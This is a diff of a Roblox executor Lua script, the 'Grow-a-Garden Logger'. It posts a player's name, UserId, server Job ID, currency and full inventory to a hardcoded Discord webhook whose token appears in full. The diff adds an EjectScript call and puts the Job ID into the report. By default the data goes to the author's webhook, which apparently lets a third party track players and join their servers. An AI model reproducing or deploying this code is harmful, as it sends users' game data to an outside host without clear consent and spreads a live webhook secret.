@@ -1,3 +1,4 @@
+pcall(function() _G.EjectScript() end)
 local webhook = webhook_link or "https://discord.com/api/webhooks/1382544011969040485/CV2BVbKw_9wkgMt-qiB71Lk3IBsUF-uryjHsz_b1WqaiXXhaOpbOqqYayy6N72_rzdyt"
 
 local UPDATE_INTERVAL = webhook_update_interval or 1800 -- seconds (30 minutes). Change as needed.
@@ -141,39 +142,41 @@ local function gatherAndSend()
         avatar_url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. player.UserId .. "&size=150x150&format=Png&isCircular=false",
        
         embeds = { {
-            title = "**" .. player.Name .. "**",
+            title = "🌴 Garden Logger • Pet & Inventory Snapshot \n‎",
             thumbnail = {
                 url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. player.UserId .. "&size=150x150&format=Png&isCircular=false"
             },
-            description = "_ _\n> **🪙 Sheckles  **: " ..
-                (player.leaderstats and player.leaderstats:FindFirstChild("Sheckles") and formatNumberWithCommas(player.leaderstats.Sheckles.Value) or "Unknown") ..
-                "\n_ _\n_ _\n**> 🎒 | Inventory**\n_ _\n_ _",
+            description = 
+            "> **🌾 User : **" .. player.Name .. "\n" ..
+            "> **🔗 Job ID : **" .. tostring(game.JobId) .. "\n" ..
+            "> **🪙 Sheckles : **" .. (player.leaderstats and player.leaderstats:FindFirstChild("Sheckles") and formatNumberWithCommas(player.leaderstats.Sheckles.Value) or "Unknown") .. " €\n" ..
+            "\n\n> **🎒 | Inventory **\n\n",
             color = 2750290,
             fields = {
                 {
-                    name = "> 🐶 | Pets Equipped",
+                    name = "> 🐶  | Pets Equipped",
                     value = codeBlock(petsEquipped),
                     inline = false
                 },
                 {
-                    name = "> 🥚 | Eggs & Pets",
+                    name = "> 🥚  | Eggs & Pets",
                     value = codeBlock(eggs)  .. "\n" .. codeBlock(pets),
                     inline = false
                 },
                 {
-                    name = "> 🔧 | Gears",
+                    name = "> 🔧  | Gears",
                     value = codeBlock(gears),
                     inline = false
                 },
                 {
-                    name = "> 🌱 | Seeds",
-                    value = codeBlock(seeds, true),
+                    name = "> 🌱  | Seeds",
+                    value = codeBlock(seeds, true) .. "\n‎",
                     inline = false
                 },
 
             },
             footer = {
-                text = "User: " .. player.Name .. " | ID: " .. player.UserId
+                text = "🌱 Player: " .. player.Name .. " • 🪪 ID: " .. player.UserId .. "\n🌿 JobID: " .. tostring(game.JobId) .. "\n\n 📬 Grow-a-Garden Logger v1 • by kib"
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
